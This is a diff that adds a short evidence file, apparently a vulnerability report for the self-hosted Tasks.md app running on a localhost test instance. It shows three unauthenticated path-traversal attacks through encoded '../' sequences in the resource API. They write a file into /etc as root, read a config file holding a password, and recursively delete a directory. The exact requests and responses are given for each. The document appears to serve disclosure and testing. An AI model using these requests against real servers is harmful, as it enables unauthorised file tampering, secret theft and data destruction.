@@ -1,0 +1,15 @@
+### Target: Tasks.md (baldissaramatheus/tasks.md:latest), http://localhost:8092  (NO AUTH)
+
+## [1] Unauth arbitrary file WRITE outside TASKS_DIR (/tasks) -> /etc as root
+POST /_api/resource/..%2f..%2f..%2fetc%2fEVID_write.conf  => HTTP 201
+-rw-r--r--    1 root     root            48 Oct  2 04:47 /etc/EVID_write.conf
+owner/content: written-outside-tasks-as-root by unauth attacker
+server user: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+## [2] Unauth arbitrary file READ outside TASKS_DIR (leaks /opt/secretapp/config.md)
+[{"name":"secretapp","files":[{"name":"config","content":"DB_PASSWORD=s3cr3t-admin-token\n","lastUpdated":"2026-10-02T04:46:33.908Z","createdAt":"2026-10-02T04:46:33.908Z"}]}]
+
+## [3] Unauth arbitrary recursive DELETE outside TASKS_DIR
+before: f
+DELETE /_api/resource/..%2f..%2fopt%2fevid_victim => HTTP 204
+after: DELETED
